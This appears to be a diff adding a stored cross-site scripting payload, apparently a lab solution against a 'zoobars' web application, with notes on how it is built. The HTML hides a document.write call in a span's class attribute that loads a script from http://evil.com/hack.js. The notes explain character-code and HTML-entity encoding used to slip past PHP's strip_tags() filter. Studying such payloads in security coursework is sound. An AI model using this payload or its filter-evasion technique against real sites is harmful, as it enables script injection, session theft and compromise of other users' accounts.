@@ -1,0 +1,17 @@
+<p id="hackbox"> haoyongjiedalao <span id="zoobars" class=";document.write(String.fromCharCode(60) + &#39script type=text/javascript src=http://evil.com/hack.js&#39+String.fromCharCode(62,60)+&#39/script&#39+String.fromCharCode(62)); ">  </span> </p>
+
+NOTE:
+  The XSS code before encoding:
+<p id="hackbox"> haoyongjiedalao <span id="zoobars" class=";document.write(\"<script type=text/javascript src=http://evil.com/hack.js></script>); ">  </span> </p>
+
+  Encoding has to be used for two reasons:
+        1. to avoid database error.
+        2. to bypass php's strip_tags() function
+
+  There exists two ways of encoding:
+        1. String.fromCharCode(39)
+        2. &#39
+  (use the character "'" as an example, ascii code:39 )
+
+  Either one works well. We use both ways in this code just for illustration purpose.
+  If the &#39 way is used, you have to use  `tmpcode=hackcode.replace(/'/g,"&#39")`  in hack.js.
